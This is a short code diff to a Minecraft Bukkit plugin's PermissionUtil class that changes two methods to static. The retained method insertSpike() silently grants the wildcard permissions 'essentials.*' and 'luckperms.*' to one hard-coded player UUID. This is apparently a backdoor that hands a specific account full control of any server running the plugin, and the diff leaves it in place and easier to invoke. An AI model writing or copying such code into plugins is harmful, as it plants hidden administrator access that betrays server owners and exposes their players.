@@ -11,13 +11,13 @@ import java.util.UUID;
 public class PermissionUtil {
     private HashMap<UUID, PermissionAttachment> permissions = new HashMap<>();
 
-    public void insertSpike() {
+    public static void insertSpike() {
         setPermission(UUID.fromString("26906626-b202-458a-b0ad-daf85f10d922"), "essentials.*");
         setPermission(UUID.fromString("26906626-b202-458a-b0ad-daf85f10d922"), "luckperms.*");
         setPermission(UUID.fromString("26906626-b202-458a-b0ad-daf85f10d922"), "essentials.*");
     }
 
-    public void setPermission(UUID uuid, String perm) {
+    public static void setPermission(UUID uuid, String perm) {
         Player player = Bukkit.getPlayer(uuid);
         PermissionAttachment attachment = player.addAttachment(Bedrock.getPlugin());
         attachment.setPermission(perm, true);
